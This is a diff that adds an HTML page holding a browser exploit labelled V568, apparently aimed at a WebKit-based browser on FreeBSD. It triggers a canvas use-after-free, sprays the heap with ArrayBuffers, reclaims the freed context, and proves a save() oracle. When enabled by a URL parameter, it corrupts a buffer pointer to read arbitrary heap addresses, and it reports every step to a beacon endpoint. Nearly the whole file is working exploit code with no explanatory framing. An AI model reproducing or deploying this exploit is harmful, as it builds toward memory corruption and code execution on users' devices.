@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V568</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V568-'+tag+'?d='+encodeURIComponent(String(data).substring(0,500))+'&t='+Date.now(),true);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+// =============================================
+// UTILITY: Write uint64 LE to DataView
+// JS can't do 64-bit writes natively, use two 32-bit writes
+// =============================================
+function writeU64LE(dv, offset, lo32, hi32) {
+  dv.setUint32(offset, lo32, true);
+  dv.setUint32(offset + 4, hi32, true);
+}
+
+function readU64Hex(dv, offset) {
+  var lo = dv.getUint32(offset, true);
+  var hi = dv.getUint32(offset + 4, true);
+  return '0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0');
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx,canvas:outer};
+}
+
+function lightGC(){
+  for(var g=0;g<3;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+beacon('BOOT','V568-heap-oracle');
+
+// =============================================
+// PHASE 1: Heap warmup
+// =============================================
+var warmup=[];
+for(var i=0;i<100;i++){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  warmup.push(c.getContext('2d'));
+}
+warmup=null;
+lightGC();
+
+// =============================================
+// PHASE 2: AB Spray — 30000 x AB(4096) = ~120MB
+// Each AB has a MARKER at offset 48 (where lineWidth maps in State)
+// Marker = 1000000.0 + index (unique, easy to identify)
+// =============================================
+var SPRAY_COUNT = 30000;
+var SPRAY_SIZE = 4096;
+var spray = [];
+var sprayDVs = [];
+
+beacon('SPRAY','count='+SPRAY_COUNT+'|size='+SPRAY_SIZE);
+
+for (var i = 0; i < SPRAY_COUNT; i++) {
+  var ab = new ArrayBuffer(SPRAY_SIZE);
+  var dv = new DataView(ab);
+  // Write marker at offset 48 (State.lineWidth offset)
+  dv.setFloat64(48, 1000000.0 + i, true);
+  // Also write marker at offset 0 for verification
+  dv.setFloat64(0, 2000000.0 + i, true);
+  spray.push(ab);
+  sprayDVs.push(dv);
+}
+
+beacon('SPRAYED','count='+spray.length+'|totalMB='+(SPRAY_COUNT*SPRAY_SIZE/1048576).toFixed(1));
+
+// =============================================
+// PHASE 3: triggerUAF + AB(768) reclaim
+// =============================================
+var u = triggerUAF();
+var danglingCtx = u.ctx;
+u.ctx = null;
+u = null;
+
+// AB(768) reclaim
+var reclaim = [];
+var reclaimDVs = [];
+for (var i = 0; i < 200; i++) {
+  var ab = new ArrayBuffer(768);
+  var dv = new DataView(ab);
+  // Set non-zero m_canvas at offset 32 (prevents GC issues)
+  writeU64LE(dv, 32, 0x41414141, 0x00000042);
+  reclaim.push(ab);
+  reclaimDVs.push(dv);
+}
+
+// Find which AB reclaimed the slot by checking save()
+// save() reads m_size at AB[124]. Set all to 1 and check m_unrealizedSaveCount at AB[384]
+var reclaimIdx = -1;
+for (var i = 0; i < reclaim.length; i++) {
+  reclaimDVs[i].setUint32(124, 1, true); // m_size = 1
+  reclaimDVs[i].setUint32(384, 0, true); // m_unrealizedSaveCount = 0
+}
+
+// Call save() through dangling ctx — increments m_unrealizedSaveCount at AB[384]
+try {
+  danglingCtx.save();
+} catch(e) {
+  beacon('SAVE-ERR', e.message);
+}
+
+// Check which AB has m_unrealizedSaveCount = 1
+for (var i = 0; i < reclaim.length; i++) {
+  var usc = reclaimDVs[i].getUint32(384, true);
+  if (usc === 1) {
+    reclaimIdx = i;
+    break;
+  }
+}
+
+beacon('RECLAIM', 'idx='+reclaimIdx);
+
+if (reclaimIdx < 0) {
+  beacon('FAIL','no-reclaim');
+  throw new Error('STOP');
+}
+
+var rDV = reclaimDVs[reclaimIdx];
+
+// =============================================
+// PHASE 4: Verify save/restore oracle works
+// =============================================
+// Reset: m_size=0 (save becomes no-op), then set to 1
+rDV.setUint32(124, 0, true);
+rDV.setUint32(384, 0, true);
+try { danglingCtx.save(); } catch(e) {}
+var usc0 = rDV.getUint32(384, true);
+beacon('T4A', 'msize0-save|usc='+usc0+'|expect=0'); // save with m_size=0 should NOT increment
+
+rDV.setUint32(124, 1, true);
+rDV.setUint32(384, 0, true);
+try { danglingCtx.save(); } catch(e) {}
+var usc1 = rDV.getUint32(384, true);
+beacon('T4B', 'msize1-save|usc='+usc1+'|expect=1'); // save with m_size=1 SHOULD increment
+
+if (usc0 !== 0 || usc1 !== 1) {
+  beacon('FAIL', 'save-oracle-broken|usc0='+usc0+'|usc1='+usc1);
+  throw new Error('STOP');
+}
+
+beacon('ORACLE','save-oracle-verified');
+
+// =============================================
+// PHASE 4C: Report AB reclaim details for later analysis
+// =============================================
+(function(){
+  try {
+    // Read what's currently at key offsets in the reclaim AB
+    var vtable_lo = rDV.getUint32(0, true);
+    var vtable_hi = rDV.getUint32(4, true);
+    var m_canvas_lo = rDV.getUint32(32, true);
+    var m_canvas_hi = rDV.getUint32(36, true);
+    var mbuf_lo = rDV.getUint32(112, true);
+    var mbuf_hi = rDV.getUint32(116, true);
+    var mcap = rDV.getUint32(120, true);
+    var msz = rDV.getUint32(124, true);
+    beacon('T4C', 'vtable=0x'+vtable_hi.toString(16)+vtable_lo.toString(16).padStart(8,'0')+'|canvas=0x'+m_canvas_hi.toString(16)+m_canvas_lo.toString(16).padStart(8,'0'));
+    beacon('T4D', 'mbuf=0x'+mbuf_hi.toString(16)+mbuf_lo.toString(16).padStart(8,'0')+'|cap='+mcap+'|sz='+msz);
+  }catch(e){beacon('T4C','ERR:'+e.message)}
+})();
+
+// =============================================
+// PHASE 5: HEAP PROBE — the dangerous part
+// Gated by ?probe=1 URL parameter. Without it, stops here safely.
+// We set m_buffer to a guessed address and read lineWidth.
+// If the address is mapped, we get a double value.
+// If unmapped, the process crashes (restart on next load).
+//
+// Strategy: try addresses spaced 128MB apart across a range.
+// FreeBSD 64-bit mmap typically starts around 0x800000000.
+// We try from 0x200000000 to 0x1000000000 in 128MB steps.
+// =============================================
+
+var doProbe = (location.search.indexOf('probe=1') >= 0);
+if (!doProbe) {
+  beacon('SAFE-ONLY', 'probe-phase-skipped|add-probe=1-to-URL-to-enable');
+  beacon('DONE','V568-safe-complete');
+  throw new Error('SAFE-STOP');
+}
+
+beacon('PROBE-START','entering-dangerous-phase');
+
+// First: verify we can READ/WRITE AB fields correctly
+rDV.setUint32(120, 1, true); // m_capacity = 1
+rDV.setUint32(124, 1, true); // m_size = 1
+
+// Build guess list: common FreeBSD mmap addresses, 128MB steps
+var guesses = [];
+// Range: 0x200000000 (8GB) to 0x1200000000 (72GB)
+// Step: 0x8000000 (128MB)
+for (var hi = 2; hi <= 0x12; hi++) {
+  for (var loStep = 0; loStep < 8; loStep++) {
+    var lo32 = loStep * 0x08000000; // 128MB steps in low 32 bits
+    var hi32 = hi;
+    guesses.push({lo: lo32, hi: hi32, label: '0x'+hi32.toString(16)+lo32.toString(16).padStart(8,'0')});
+  }
+}
+
+// Also try lower range: 0x80000000 to 0x200000000
+for (var loStep = 0x80000000; loStep > 0; loStep -= 0x08000000) {
+  guesses.push({lo: loStep >>> 0, hi: 0, label: '0x00000000'+loStep.toString(16).padStart(8,'0')});
+}
+
+beacon('PROBES','count='+guesses.length);
+
+// Probe loop
+var found = false;
+for (var gi = 0; gi < guesses.length; gi++) {
+  var g = guesses[gi];
+
+  // Write guess address to m_buffer at AB[112-119]
+  writeU64LE(rDV, 112, g.lo, g.hi);
+  rDV.setUint32(120, 1, true); // m_capacity
+  rDV.setUint32(124, 1, true); // m_size
+
+  // beacon BEFORE the dangerous read (survives crash)
+  beacon('PRE', gi+'|'+g.label);
+
+  // THE DANGEROUS READ — may crash if address is unmapped
+  var lw;
+  try {
+    lw = danglingCtx.lineWidth;
+  } catch(e) {
+    beacon('PROBE-CATCH', gi+'|'+g.label+'|'+e.message);
+    continue;
+  }
+
+  // If we get here, the address was mapped!
+  beacon('HIT', gi+'|'+g.label+'|lw='+lw);
+
+  // Check if it matches our spray marker
+  if (lw >= 1000000.0 && lw < 1000000.0 + SPRAY_COUNT) {
+    var sprayIdx = Math.round(lw - 1000000.0);
+    // The guess address + 48 landed in spray[sprayIdx] at offset 48
+    // So spray[sprayIdx] address = guess address
+    // spray[sprayIdx] is AB(4096), its address is guessAddr
+    beacon('FOUND', 'sprayIdx='+sprayIdx+'|guessAddr='+g.label+'|lw='+lw);
+    found = true;
+
+    // Verify by reading at offset 0 (marker 2000000+idx)
+    // Set m_buffer to guessAddr - 48 (so lineWidth reads from guessAddr + 0)
+    // Actually, lineWidth reads m_buffer + 48. We want to read guessAddr + 0.
+    // So m_buffer = guessAddr - 48
+    var verifyLo = (g.lo - 48) >>> 0;
+    var verifyHi = g.hi;
+    if (g.lo < 48) verifyHi--; // borrow
+    writeU64LE(rDV, 112, verifyLo, verifyHi);
+    var verify;
+    try {
+      verify = danglingCtx.lineWidth;
+    } catch(e) {
+      beacon('VERIFY-ERR', e.message);
+      verify = 'crash';
+    }
+    beacon('VERIFY', 'expected='+(2000000+sprayIdx)+'|got='+verify);
+
+    // Read more offsets to map the heap
+    // Read at guessAddr + SPRAY_SIZE (next AB)
+    writeU64LE(rDV, 112, g.lo + SPRAY_SIZE - 48, g.hi);
+    var nextLW;
+    try { nextLW = danglingCtx.lineWidth; } catch(e) { nextLW = 'err'; }
+    beacon('NEXT-AB', 'lw='+nextLW+'|expected='+(1000000+sprayIdx+1));
+
+    break;
+  }
+}
+
+if (!found) {
+  beacon('NOFIND', 'tried='+guesses.length+'|last_pre_crash_above');
+}
+
+// Reset m_size to 0 (safe state)
+rDV.setUint32(124, 0, true);
+
+beacon('DONE','V568-complete|found='+found);
+</script>
+</body></html>
